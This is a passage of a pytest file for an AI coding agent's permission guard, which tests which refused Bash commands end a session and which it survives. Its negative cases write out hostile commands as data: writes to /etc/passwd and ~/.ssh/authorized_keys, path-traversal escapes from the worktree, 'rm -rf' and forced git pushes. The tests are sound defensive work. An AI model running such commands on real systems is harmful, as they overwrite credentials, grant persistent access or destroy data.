    worktree = _make_non_tmp_worktree(request)
    outside = worktree.parent / "outside"
    outside.mkdir()
    (worktree / "esc").symlink_to(outside, target_is_directory=True)
    f = permissions_module._destination_veto_reason
    wt = str(worktree)
    abs_target = str(worktree / "esc" / "x")
    assert f(f"cargo build --release > {abs_target}", wt) is not None


def test_destination_veto_tmp_absolute_redirect_still_allowed(
    tmp_path: Path,
) -> None:
    """cpp#176 — mandatory negative-test gate, case 3. Negative control: the
    lexical `/tmp/` exception (cpp#143/#150/#155) is unchanged by this fix —
    it stays purely lexical (a literal `/tmp/` prefix on the un-resolved
    operand text), never routed through `is_within_project`/`Path.resolve()`.
    """
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    f = permissions_module._destination_veto_reason
    wt = str(worktree)
    assert f("echo hi > /tmp/cpp176-scratch", wt) is None


def test_destination_veto_mika_1719_probe_command_no_longer_vetoed(
    request: pytest.FixtureRequest,
) -> None:
    """cpp#176 — the EXACT mika#1719 command probe (session 4667a1c2, died
    2026-09-10 21:16 on `error_during_execution:after_deny`, 0 commits),
    replayed verbatim against a real worktree dir this test creates, with
    `cwd` set to that worktree — the shape `_denial_is_terminal`/
    `_destination_veto_reason` actually saw. The real worktree lived under
    `/data/workspace/mika-platform/.claude/worktrees/...` (never `/tmp/`),
    reproduced here by rooting under `/var/tmp` (see
    `_make_non_tmp_worktree`) so this test cannot be accidentally satisfied by
    the unrelated `/tmp/` lexical exception. Must now return ``None`` (no
    veto)."""
    import shutil
    import tempfile

    base = Path(tempfile.mkdtemp(dir="/var/tmp", prefix="cpp176-mika1719-"))
    request.addfinalizer(lambda: shutil.rmtree(base, ignore_errors=True))
    worktree = base / "mika-platform" / ".claude" / "worktrees" / "fix-1719-telemetry-build"
    worktree.mkdir(parents=True)
    (worktree / ".git").mkdir()
    f = permissions_module._destination_veto_reason
    wt = str(worktree)
    cmd = (
        "/usr/bin/time -v cargo build --release --features telemetry "
        f"--bin mika-spirit > {wt}/out"
    )
    assert f(cmd, wt) is None


# ────────────────────────────────────────────────────────────────────────────
# cpp#151 B0/B1 — the lethality of a refusal becomes readable, and the
# survivable half marks the session
#
# cpp#128 split the DECISION from the LETHALITY and left the second half
# unlogged: `ui.log_policy_deny` took no `terminal` argument and
# `_record_decision` emitted only `decision` + `rule_id`. Standing in front of
# the eight dead sessions in the cpp#151 body, nobody could say which ones
# claude-pilot had ASKED to kill (destination veto, tier3-dangerous Bash —
# correct by design) and which died DESPITE `interrupt=False`. These tests pin
# both halves at once: the stderr suffix an operator greps, and the session
# marker agent.py reads.
# ────────────────────────────────────────────────────────────────────────────


def _deny_lines(captured: str) -> list[str]:
    """Every `[policy:deny]`-family line in a captured stderr blob, ANSI intact.

    Matching on the bare tag rather than the colored prefix keeps the helper
    independent of the palette in `ui.py`.
    """
    return [ln for ln in captured.splitlines() if "[policy:deny" in ln]


def test_151_nonterminal_rule_deny_says_so_and_marks_the_session(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """The exact shape that killed the ticket's sessions: a rule-based refusal
    of a non-dangerous Bash command.

    Three consumers of ONE lethality verdict are asserted together, because the
    bug cpp#151 B0 closes is precisely that they could disagree: the SDK result
    (`interrupt`), the operator-facing log line, and the session marker
    agent.py later reads."""
    policy_file = tmp_path / "rule_deny.yaml"
    policy_file.write_text(
        "rules:\n"
        "  - id: bash-grep\n"
        "    tool: Bash\n"
        "    pattern: '^env \\| grep'\n"
        "    decision: deny\n"
        "    reason: composed read-only command not allow-listed\n"
        "default:\n"
        "  decision: allow\n"
        "  reason: default allow (test fixture)\n"
    )
    guardrails = SessionGuardrails(GUARDRAIL_DEFAULTS.model_copy())
    handler = create_permission_handler(
        config=None,
        relay=False,
        verbose=False,
        cwd="/tmp",
        guardrails=guardrails,
        policy_path=policy_file,
    )
    result = asyncio.run(
        handler("Bash", {"command": "env | grep -c MIKA"}, _mock_ctx())
    )

    assert isinstance(result, PermissionResultDeny)
    assert result.interrupt is False
    lines = _deny_lines(capsys.readouterr().err)
    assert len(lines) == 1, lines
    assert "(non-terminal)" in lines[0], lines[0]
    assert "bash-grep" in lines[0], lines[0]
    assert guardrails.nonterminal_policy_deny is True
    assert guardrails.nonterminal_policy_deny_summary is not None
    assert "env | grep -c MIKA" in guardrails.nonterminal_policy_deny_summary


def test_151_tier3_dangerous_deny_says_terminal_and_leaves_the_marker_clear(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """NON-REGRESSION, arm 1 of 2 (ticket AC4 / plan § "Ce que (B) ne fait pas").

    A tier3-dangerous Bash command is a refusal claude-pilot ASKS to be fatal.
    It must keep `interrupt=True`, must say `(terminal)` in the log, and must
    NOT arm the session marker — arming it would hand a deliberately lethal
    class a free resume in agent.py, which is the one way this change could
    have weakened the safety surface."""
    policy_file = tmp_path / "rule_deny.yaml"
    policy_file.write_text(
        "rules:\n"
        "  - id: deny-sed\n"
        "    tool: Bash\n"
        "    pattern: '^sed\\s'\n"
        "    decision: deny\n"
        "    reason: in-place edit refused\n"
        "default:\n"
        "  decision: allow\n"
        "  reason: default allow (test fixture)\n"
    )
    guardrails = SessionGuardrails(GUARDRAIL_DEFAULTS.model_copy())
    handler = create_permission_handler(
        config=None,
        relay=False,
        verbose=False,
        cwd="/tmp",
        guardrails=guardrails,
        policy_path=policy_file,
    )
    result = asyncio.run(
        # mika#2565 carved the IN-WORKTREE `sed -i` case to survivable, so the
        # deliberately-lethal example here uses an ABSOLUTE, out-of-worktree
        # target (cwd=/tmp), which stays terminal.
        handler("Bash", {"command": "sed -i 's/a/b/' /etc/passwd"}, _mock_ctx())
    )

    assert isinstance(result, PermissionResultDeny)
    assert result.interrupt is True, "cpp#128's deliberate lethal class must stay lethal"
    lines = _deny_lines(capsys.readouterr().err)
    assert len(lines) == 1, lines
    assert "(terminal)" in lines[0], lines[0]
    assert "(non-terminal)" not in lines[0], lines[0]
    assert guardrails.nonterminal_policy_deny is False, (
        "a refusal we asked to be fatal must never arm the resume marker"
    )


def test_151_destination_veto_says_terminal_and_leaves_the_marker_clear(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """NON-REGRESSION, arm 2 of 2: worktree containment.

    A write escaping the worktree reaches the destination-veto site, whose
    `interrupt=True` is unconditional by design (cpp#128's named exception).
    Same three assertions as the tier3 arm — and the marker stays clear, so a
    session that has already left its sandbox in intent cannot buy another
    turn."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    guardrails = SessionGuardrails(GUARDRAIL_DEFAULTS.model_copy())
    handler = create_permission_handler(
        config=None,
        relay=False,
        verbose=False,
        cwd=str(worktree),
        guardrails=guardrails,
        policy_path=_BUNDLED_POLICY,
    )
    result = asyncio.run(
        handler("Bash", {"command": "mkdir -p /definitely/outside/x"}, _mock_ctx())
    )

    assert isinstance(result, PermissionResultDeny)
    assert result.interrupt is True
    lines = _deny_lines(capsys.readouterr().err)
    assert len(lines) == 1, lines
    assert "(terminal)" in lines[0], lines[0]
    assert "(non-terminal)" not in lines[0], lines[0]
    assert guardrails.nonterminal_policy_deny is False


def test_151_chain_veto_reports_the_lethality_it_actually_returned(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """The chain-veto site is the one whose verdict is COMPUTED rather than
    literal, so both of its outcomes are pinned over the same command shape.

    Inside the worktree the composed `mkdir` is refused and survivable; the
    identical shape pointing outside is refused and fatal. If a future edit
    made the log line quote a second, independently-computed verdict, one of
    these two arms would disagree with its `interrupt`."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    guardrails = SessionGuardrails(GUARDRAIL_DEFAULTS.model_copy())
    handler = create_permission_handler(
        config=None,
        relay=False,
        verbose=False,
        cwd=str(worktree),
        guardrails=guardrails,
        policy_path=_BUNDLED_POLICY,
    )

    inside = asyncio.run(
        handler("Bash", {"command": 'echo "go"; mkdir -p docs/plans'}, _mock_ctx())
    )
    assert isinstance(inside, PermissionResultDeny)
    assert inside.interrupt is False
    inside_lines = _deny_lines(capsys.readouterr().err)
    assert len(inside_lines) == 1, inside_lines
    assert "(non-terminal)" in inside_lines[0], inside_lines[0]
    assert guardrails.nonterminal_policy_deny is True

    outside = asyncio.run(
        handler(
            "Bash",
            {"command": 'echo "go"; mkdir -p /definitely/outside/x'},
            _mock_ctx(),
        )
    )
    assert isinstance(outside, PermissionResultDeny)
    assert outside.interrupt is True
    outside_lines = _deny_lines(capsys.readouterr().err)
    assert len(outside_lines) == 1, outside_lines
    assert "(terminal)" in outside_lines[0], outside_lines[0]
    assert "(non-terminal)" not in outside_lines[0], outside_lines[0]


def test_151_deny_with_notify_is_terminal_and_leaves_the_marker_clear(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """`escalate` (deny-with-notify) was untouched by cpp#128 and stays
    untouched here: terminal on the wire, `(terminal)` in the log, marker
    clear. An escalate exists to put a human in the loop; resuming past one
    would defeat its only purpose."""
    policy_file = tmp_path / "escalate.yaml"
    policy_file.write_text(
        "rules:\n"
        "  - id: escalate-skill\n"
        "    tool: Skill\n"
        "    pattern: '^test-target$'\n"
        "    decision: escalate\n"
        "    reason: rule-based test escalate\n"
        "default:\n"
        "  decision: allow\n"
        "  reason: default allow (test fixture)\n"
    )
    guardrails = SessionGuardrails(GUARDRAIL_DEFAULTS.model_copy())
    handler = create_permission_handler(
        config=None,
        relay=False,
        verbose=False,
        cwd="/tmp",
        guardrails=guardrails,
        policy_path=policy_file,
    )

    original = permissions_module._fire_notify
    permissions_module._fire_notify = lambda *_a: None  # type: ignore[assignment]
    try:
        result = asyncio.run(handler("Skill", {"skill": "test-target"}, _mock_ctx()))
    finally:
        permissions_module._fire_notify = original  # type: ignore[assignment]

    assert isinstance(result, PermissionResultDeny)
    assert result.interrupt is True
    lines = _deny_lines(capsys.readouterr().err)
    assert len(lines) == 1, lines
    assert "[policy:deny_with_notify]" in lines[0], lines[0]
    assert "(terminal)" in lines[0], lines[0]
    assert guardrails.nonterminal_policy_deny is False


def test_151_terminal_flag_reaches_the_audit_wire(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """B0 step 3: the same verdict travels on the cm#99 side-channel.

    Both arms in one test — a wire field that is always the same value carries
    exactly as little as the absent field it replaces."""
    emitted: list[dict[str, object]] = []

    def _capture(**kwargs: object) -> None:
        emitted.append(kwargs)

    monkeypatch.setattr(permissions_module.permission_events, "emit", _capture)

    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    handler = create_permission_handler(
        config=None,
        relay=False,
        verbose=False,
        cwd=str(worktree),
        policy_path=_BUNDLED_POLICY,
    )
    asyncio.run(handler("Bash", {"command": 'echo "go"; mkdir -p docs/plans'}, _mock_ctx()))
    asyncio.run(
        handler("Bash", {"command": "mkdir -p /definitely/outside/x"}, _mock_ctx())
    )

    assert len(emitted) == 2, emitted
    assert emitted[0]["decision"] == "deny"
    assert emitted[0]["terminal"] is False
    assert emitted[1]["decision"] == "deny"
    assert emitted[1]["terminal"] is True


# ────────────────────────────────────────────────────────────────────────────
# cpp#195 — `git show <ref>:<path> > /tmp/x` was refused TERMINAL despite the
# cpp#154 /tmp lexical carve-out. The real halt: mika#2471 (MPC replay against
# `main`'s classifier, transcript 117d7a20), the exact command reproduced
# below. Established cause, verified at source (probe against this repo's
# HEAD, not assumed from the ticket): `is_tier3_dangerous_for_lethality`
# already strips a lexically-contained `/tmp/` redirect (cpp#154), and
# `_redirect_destination_veto_reason` (the whole-command, verb-agnostic
# fallback) already grants the same /tmp carve-out — but `_destination_veto_
# reason`'s PER-WRITE-KIND branch only ever granted it to the generic
# `bash-redirect` kind (cpp#155). The write-kind `bash-git-show-redirect`
# (cpp#35/#128, `git show <ref>:<path> >`) predates that generalization and
# was never extended: an absolute `/tmp/…` target for THAT kind fell straight
# through to the generic `is_within_project` containment check and vetoed as
# "resolves outside the worktree" — terminal, because `_denial_is_terminal`
# ORs in `_destination_veto_reason`'s verdict.
#
# This IS an inconsistency, not a ratified invariant: cpp#154's own carve-out
# (`is_tier3_dangerous_for_lethality`) is direct evidence of intent (a /tmp
# research-write is not lethal), and cpp#155's docstring on
# `_redirect_destination_veto_reason` says in so many words that
# `_destination_veto_reason` is meant to be "a STRICT SUPERSET of what this
# function proves for redirects" — which was false for exactly this
# write-kind until this fix. No doc under `docs/solutions/` ratifies
# confinement-escape lethality as independent of cpp#154's carve-out for this
# case; the only design-intent evidence found points the other way.
#
# THE FIX IS NARROWLY SCOPED to `_destination_veto_reason`'s
# `bash-git-show-redirect` branch, reusing the EXACT shared predicate
# (`_is_contained_redirect_target(dest) and dest.startswith("/tmp/")`) cpp#154/
# #155/#176 already use for `bash-redirect` — see the block comment at that
# branch. It does not touch `is_tier3_dangerous`/the REFUSAL, and it does not
# touch the YAML allow rules: the write STAYS refused, only its LETHALITY
# changes. The allow-path call site (`create_permission_handler`, the
# unconditional-`interrupt=True` destination veto) cannot regress from this:
# it only reaches `bash-git-show-redirect` kind via the `bash-git-show-
# redirect` YAML rule_id, whose pattern requires a RELATIVE target
# (`(?!/)`) — a `/tmp/…` absolute target can never carry that rule_id, so it
# always arrives at `_destination_veto_reason` through the DENY route (chain-
# veto or default-deny), which is the only route `_denial_is_terminal` feeds.
#
# FOLLOW-UP (same ticket, MPC review round 2): the first pass fixed the
# SINGLE-target `git show …:x > /tmp/x` shape, but the REAL mika#2471 command
# carries a trailing `2>/dev/null || true` (`git show origin/main:crates/
# mika-common/src/home.rs > /tmp/ck_home_main.rs 2>/dev/null || true`) and was
# STILL terminal after the first fix — a second, compounding bug:
# `_extract_write_destinations`'s `bash-git-show-redirect` branch used an
# END-ANCHORED regex (`>\s*([\w./-]+)\s*$`) that only ever captured the LAST
# redirect target on the line, so the stdout target (`/tmp/ck_home_main.rs`,
# already carved out) was never even inspected — only the trailing
# `2>/dev/null` was, and THAT write-kind had no `/dev/null` carve-out either
# (the `/dev/null` skip lived only in the `bash-redirect` branch). Two things
# were fixed together, factored to share logic with `bash-redirect` so they
# cannot drift apart again (cpp#151/#155's named failure mode):
#   1. extraction now walks EVERY redirect target on the line (reuses
#      `_segment_redirect_targets`, the same extraction `bash-redirect`
#      already uses), not just the last one;
#   2. the per-target carve-out (`/dev/null` sink, `/tmp/` lexical carve,
#      lexical-disqualification fail-closed) is now ONE branch shared by both
#      `bash-redirect` and `bash-git-show-redirect` write-kinds.
# The result is COMPOSABLE: the aggregate is non-terminal SSI EVERY target on
# the line is individually non-lethal (contained /tmp/, or /dev/null); one
# genuinely out-of-worktree, non-/tmp, non-/dev/null target anywhere on the
# line still vetoes the whole segment — proven by the mixed-target negative
# tests below.
# ────────────────────────────────────────────────────────────────────────────

_MIKA_2471_COMMAND = (
    "git show origin/main:crates/mika-common/src/home.rs "
    "> /tmp/ck_home_main.rs 2>/dev/null || true"
)


def test_cpp195_destination_veto_git_show_tmp_carve_out(tmp_path: Path) -> None:
    """Unit-level: `_destination_veto_reason` grants `bash-git-show-redirect`
    the SAME /tmp carve-out `bash-redirect` already has.

    Anti-vacuity: this assertion is `is not None` on pre-fix `main` — captured
    red below (`test_cpp195_red_before_fix_is_captured`)."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)
    f = permissions_module._destination_veto_reason

    assert f(_MIKA_2471_COMMAND, wt) is None
    assert f("git show origin/main:x > /tmp/scratch.rs", wt) is None
    # Note: `$`-suffixed targets (cpp#154 D3's mkdir-loop residue) are out of
    # scope here — the extraction's charset has never admitted `$`, for ANY
    # destination, tmp or not; that is a pre-existing, unrelated property of
    # git-show-redirect extraction this fix does not touch (fails closed:
    # unparseable destination stays vetoed).


def test_cpp195_destination_veto_git_show_devnull_carve_out(tmp_path: Path) -> None:
    """The composability gap named in the follow-up: `/dev/null` alone (no
    /tmp target at all) must ALSO be carved out for `bash-git-show-redirect`,
    exactly as it already is for `bash-redirect` (cpp#130)."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)
    f = permissions_module._destination_veto_reason

    assert f("git show origin/main:x > /dev/null", wt) is None
    assert f("git show origin/main:x > /dev/null 2>&1", wt) is None


def test_cpp195_destination_veto_git_show_composition_every_target_extracted(
    tmp_path: Path,
) -> None:
    """Anti-vacuity for the extraction half of the follow-up fix: BOTH targets
    on a multi-redirect git-show line are visible to the veto, not only the
    last one. Pins the mechanism directly, independent of which target
    happens to carve out."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    seg = "git show origin/main:x > /tmp/a.rs 2>/dev/null"
    kind = permissions_module._segment_write_kind(seg)
    assert kind == "bash-git-show-redirect"
    dests = permissions_module._extract_write_destinations(kind, seg)
    assert dests is not None
    assert set(dests) == {"/tmp/a.rs", "/dev/null"}, dests


def test_cpp195_destination_veto_git_show_non_tmp_still_vetoed(
    tmp_path: Path,
) -> None:
    """Negative control, same function: every target that is NOT lexically
    under `/tmp/` stays vetoed exactly as before — no widening."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)
    f = permissions_module._destination_veto_reason

    assert f("git show origin/main:x > /etc/ck.rs", wt) is not None
    assert f("git show origin/main:x > /var/outside/ck.rs", wt) is not None
    assert f("git show origin/main:x > ../escape.rs", wt) is not None
    assert f("git show origin/main:x > ~/escape.rs", wt) is not None


def test_cpp195_denial_is_terminal_mika_2471_replay_survivable(
    tmp_path: Path,
) -> None:
    """Positive — the exact mika#2471 halt command, exact replay. Must become
    NON-terminal (survivable): the pilot receives the deny and the session
    continues."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)

    assert (
        permissions_module._denial_is_terminal(
            "Bash", {"command": _MIKA_2471_COMMAND}, wt
        )
        is False
    )


@pytest.mark.parametrize(
    "cmd",
    [
        "git show origin/main:x > /etc/ck.rs",
        "git show origin/main:x > /var/outside/ck.rs",
        "git show origin/main:x > ../escape.rs",
        # mika#2565 carved the in-worktree `sed -i` case; an ABSOLUTE, out-of-
        # worktree target is a genuine escaping write and stays terminal.
        "sed -i 's/a/b/' /etc/f",
        "rm -rf x",
        "git push --force origin x",  # pre-existing tier3-lethal case, unchanged
        # cpp#195 follow-up — composition must NOT paper over a genuinely bad
        # target just because ANOTHER target on the same line is carved out.
        "git show origin/main:x > /tmp/x 2>/etc/y",   # tmp + non-tmp escape
        "git show origin/main:x > /etc/x 2>/dev/null",  # non-tmp escape + devnull
        "git show origin/main:x > ../escape 2>/dev/null",  # traversal + devnull
    ],
)
def test_cpp195_negative_stays_terminal(cmd: str, tmp_path: Path) -> None:
    """Negative — both-directions proof. Nothing that was terminal before this
    fix stops being terminal: a non-/tmp destination-veto, a traversal escape,
    and genuinely dangerous verbs are all unaffected. The composition cases
    prove the carve-out is per-target AND-ed, not OR-ed: ONE bad target
    anywhere on the line still vetoes the whole segment, even when another
    target on the same line is individually carved out."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)

    assert (
        permissions_module._denial_is_terminal("Bash", {"command": cmd}, wt) is True
    ), cmd


def test_cpp195_handler_end_to_end_still_denied_but_survivable(
    tmp_path: Path,
) -> None:
    """Handler-level proof, mirroring `test_handler_vetoes_redirect_to_system_
    path_end_to_end`: the exact mika#2471 command is REFUSED (never executed)
    AND non-terminal through the real `can_use_tool` callback — not merely at
    the unit level. The non-/tmp control on the SAME shape stays refused AND
    terminal, proving the fix narrows lethality only, not admission."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    handler = _bundled_handler(cwd=str(worktree))

    result = asyncio.run(
        handler("Bash", {"command": _MIKA_2471_COMMAND}, _mock_ctx())
    )
    assert isinstance(result, PermissionResultDeny), (
        "git show ...:x > /tmp/x must STILL be refused — no widening of what "
        "is admitted"
    )
    assert result.interrupt is False, (
        "the refusal must be survivable — this is the real mika#2471 halt "
        "command, replayed verbatim"
    )

    etc_control = asyncio.run(
        handler(
            "Bash",
            {"command": "git show origin/main:x > /etc/cpp195-control.rs"},
            _mock_ctx(),
        )
    )
    assert isinstance(etc_control, PermissionResultDeny)
    assert etc_control.interrupt is True, (
        "a non-/tmp destination escape on the SAME write-kind stays terminal"
    )


# ────────────────────────────────────────────────────────────────────────────
# cpp#201 — mktemp/heredoc write-destination veto: SURVIVABLE, not terminal
#
# mika#2458: a dev-groom died (terminal, PIPELINE_INCOMPLETE, $7.71) on the
# compound `cd <wt>/mika ; T=$(mktemp -d) ; cat >"$T/log" <<'EOF' … EOF`. Only
# the `cd` line was read at triage time; the ACTUAL cause is the heredoc
# write to `$T/log` — a `$`-bearing, lexically unresolvable target
# (`_is_lexically_disqualified_redirect_target`, cpp#154 D3) that is
# correctly refused (fail-closed: it cannot be proven contained) but was
# TERMINAL, same class as cpp#195/#196.
#
# The narrower cut (see `tier1._is_mktemp_scratch_redirect_target`'s block
# comment): only a redirect target rooted at a variable the SAME command
# assigns from `mktemp`'s own output becomes non-terminal. A blanket "any
# `$` is survivable" rule was tried FIRST and explicitly rejected — it
# regresses the ratified `$HOME`-stays-terminal invariant
# (`test_cpp154_home_expansion_target_stays_terminal` in
# `test_policy_devpilot.py`, `test_leading_expansion_target_stays_lethal` /
# `test_real_redirect_stays_lethal` in `test_tier1.py`) that exists
# specifically so `$HOME`/`$OLDPWD` cannot respell `~` as an escape hatch.
# Those three tests are UNMODIFIED by this ticket and pass unchanged — see
# the full-suite run in the plan doc.
# ────────────────────────────────────────────────────────────────────────────

_MIKA_2458_FULL_COMMAND = (
    "cd /data/workspace/mika-platform/.claude/worktrees/bug-1910-x/mika ; "
    "T=$(mktemp -d) ; cat >\"$T/log\" <<'EOF'\n"
    '{"event":"turn_usage"}\n'
    "EOF"
)
_MIKA_2458_BARE_COMMAND = (
    "T=$(mktemp -d) ; cat >\"$T/log\" <<'EOF'\n{\"event\":\"turn_usage\"}\nEOF"
)


def test_cpp201_denial_is_terminal_mika_2458_replay_survivable(
    tmp_path: Path,
) -> None:
    """Positive — the exact mika#2458 incident command, verbatim. Must become
    NON-terminal (survivable): the pilot receives the deny and the session
    continues. Red-before this fix (measured `True` on pre-fix HEAD, captured
    in the plan doc)."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)

    assert permissions_module._destination_veto_reason(
        _MIKA_2458_FULL_COMMAND, wt
    ) is not None, "the write must still be REFUSED — no widening of admission"
    assert (
        permissions_module._denial_is_terminal(
            "Bash", {"command": _MIKA_2458_FULL_COMMAND}, wt
        )
        is False
    )


def test_cpp201_denial_is_terminal_bare_survivable(tmp_path: Path) -> None:
    """Positive — the same write, without the leading `cd`, isolating that the
    fix narrows the mktemp/heredoc write itself and has nothing to do with
    `cd` (which cpp#199 already bounds separately)."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)

    assert (
        permissions_module._denial_is_terminal(
            "Bash", {"command": _MIKA_2458_BARE_COMMAND}, wt
        )
        is False
    )


def test_cpp201_unassigned_dollar_var_stays_terminal(tmp_path: Path) -> None:
    """Anti-vacuity negative: WITHOUT the `T=$(mktemp -d)` assignment
    anywhere in the command, `"$T/log"` is exactly as unresolvable as
    `$HOME/x` and must stay terminal — proves the carve-out is keyed on the
    provable mktemp origin, not on the mere presence of `$`."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)

    assert (
        permissions_module._denial_is_terminal(
            "Bash", {"command": "cat >\"$T/log\" <<'EOF'\nx\nEOF"}, wt
        )
        is True
    )


@pytest.mark.parametrize(
    "cmd",
    [
        # Resolvable, proven out-of-worktree, non-/tmp — stays terminal.
        "cat > /etc/passwd <<'EOF'\nx\nEOF",
        "> /var/outside/x",
        "echo hi > /etc/cpp201-control",
        # Genuinely dangerous verbs — unrelated to this write-destination
        # class, unaffected.
        "rm -rf x",
        "sed -i 's/a/b/' /etc/f",
        "git push --force origin main",
        # Anti-widening: the ratified `$HOME`-as-`~`-respelling protection
        # (cpp#154 D3) — must NOT flip just because this ticket touches the
        # same lethality path.
        "echo hi > $HOME/.ssh/authorized_keys",
        "echo hi > ${HOME}/.bashrc",
        "echo hi > $OLDPWD/y",
        "echo hi > $(whoami)",
        "echo hi > $",
        "echo hi > ~/escape",
        "echo hi > ../escape",
        # A DIFFERENT variable than the one assigned from mktemp — proximity
        # must not exempt it.
        'T=$(mktemp -d) ; cat > "$OTHER/log"',
        # A traversal riding a legitimate scratch-var prefix.
        'T=$(mktemp -d) ; cat > "$T/../../etc/passwd"',
    ],
)
def test_cpp201_negative_stays_terminal(cmd: str, tmp_path: Path) -> None:
    """Negative — both-directions proof. Nothing that was terminal before this
    fix stops being terminal, and the ratified `$HOME` invariant is not
    reopened."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)

    assert (
        permissions_module._denial_is_terminal("Bash", {"command": cmd}, wt) is True
    ), cmd


def test_cpp201_handler_end_to_end_still_denied_but_survivable(
    tmp_path: Path,
) -> None:
    """Handler-level proof, mirroring
    `test_cpp195_handler_end_to_end_still_denied_but_survivable`: the exact
    mika#2458 command is REFUSED (never executed) AND non-terminal through
    the real `can_use_tool` callback — not merely at the unit level. The
    unassigned-`$T` control on the SAME shape stays refused AND terminal,
    proving the fix narrows lethality only, not admission."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    handler = _bundled_handler(cwd=str(worktree))

    result = asyncio.run(
        handler("Bash", {"command": _MIKA_2458_FULL_COMMAND}, _mock_ctx())
    )
    assert isinstance(result, PermissionResultDeny), (
        "the mktemp/heredoc write must STILL be refused — no widening of "
        "what is admitted"
    )
    assert result.interrupt is False, (
        "the refusal must be survivable — this is the real mika#2458 "
        "incident command, replayed verbatim"
    )
    assert result.message is not None and "not lexically under /tmp/" in (
        result.message
    ), (
        "AC1: a survivable write-deny must surface a reason the pilot can "
        "adapt to, not the generic default-deny message"
    )

    unassigned_control = asyncio.run(
        handler(
            "Bash",
            {"command": "cat >\"$T/log\" <<'EOF'\nx\nEOF"},
            _mock_ctx(),
        )
    )
    assert isinstance(unassigned_control, PermissionResultDeny)
    assert unassigned_control.interrupt is True, (
        "the SAME target shape, without a same-command mktemp assignment, "
        "stays terminal"
    )


def test_cpp201_non_reopening_cpp195_cpp154_ac4(tmp_path: Path) -> None:
    """Non-reopening smoke: cpp#195/#196's /tmp git-show-redirect carve-out
    and cpp#154 AC4's sanctioned `bash-cat-heredoc-tmp` shape are untouched
    by this ticket — both are decided by entirely different code paths
    (`_destination_veto_reason`'s /tmp-prefix branch and
    `_is_sanctioned_pure_heredoc`'s whole-command shortcut, respectively),
    neither of which this ticket's `for_lethality`/mktemp-scratch changes
    touch. Full suites for cpp#128/#151/#154/#155/#166/#176/#195/#196 are
    unmodified and pass unchanged (see the plan doc's full-suite run)."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)

    assert (
        permissions_module._denial_is_terminal(
            "Bash",
            {
                "command": (
                    "git show origin/main:crates/mika-common/src/home.rs "
                    "> /tmp/ck_home_main.rs 2>/dev/null || true"
                )
            },
            wt,
        )
        is False
    )
    # cpp#154 AC4: the sanctioned literal-/tmp heredoc is an ALLOW (not a
    # deny at all), so `_destination_veto_reason` returns `None` for it —
    # unaffected by anything cpp#201 touches.
    assert (
        permissions_module._destination_veto_reason(
            "cat > /tmp/x <<'EOF'\nhello\nEOF", wt
        )
        is None
    )


# ────────────────────────────────────────────────────────────────────────────
# cpp#203 — `sed -i` targeting the inert /dev/null sink: SURVIVABLE, not
# terminal (scope B residue of mika#1686 comment 5844642872)
#
# mika#1686's dossier of 4 deny-deaths named instance #1 (pilot session
# b669ac5c, mika#2532 impl) as the ONE still-terminal residue on HEAD 9ab3c13:
#     sed -i 's/.../ X/' /dev/null; grep -n "created_by_session" crates/m.rs
# Probe: `policy.evaluate` = allow(rule_id=bash-grep) — the grep is innocent
# and first-matches — but `_denial_is_terminal` = True. The `sed -i` segment
# alone, targeting a no-op device, kills the session (error_during_execution:
# after_deny, turn 62). Scope B, lethality only: the command stays REFUSED;
# only whether the refusal ends the run changes, and only for `sed -i` (or
# any tier3-lethal write-verb `is_tier3_dangerous_for_lethality` flags)
# against a PROVEN-HARMLESS target (`/dev/null`, cpp#130's existing
# recognition, reused verbatim — no new admission, no YAML change).
# ────────────────────────────────────────────────────────────────────────────

_MIKA_2532_EXACT_INCIDENT = (
    'sed -i \'s/.../ X/\' /dev/null; grep -n "created_by_session" crates/m.rs'
)


def test_cpp203_denial_is_terminal_mika_2532_replay_survivable(
    tmp_path: Path,
) -> None:
    """Positive — the exact mika#1686/mika#2532 incident command, verbatim.
    Must become NON-terminal (survivable): the pilot receives the deny and
    the session continues, free to drop the no-op and keep the grep. Red-
    before this fix (measured `True` on pre-fix HEAD 9ab3c13)."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)

    assert (
        permissions_module._denial_is_terminal(
            "Bash", {"command": _MIKA_2532_EXACT_INCIDENT}, wt
        )
        is False
    )


def test_cpp203_denial_is_terminal_sed_i_devnull_alone_survivable(
    tmp_path: Path,
) -> None:
    """Positive — the `sed -i` segment alone, isolating the fix from the
    trailing innocent `grep`: `sed -i 's/a/b/' /dev/null` on its own must be
    survivable."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)

    assert (
        permissions_module._denial_is_terminal(
            "Bash", {"command": "sed -i 's/a/b/' /dev/null"}, wt
        )
        is False
    )


@pytest.mark.parametrize(
    "cmd",
    [
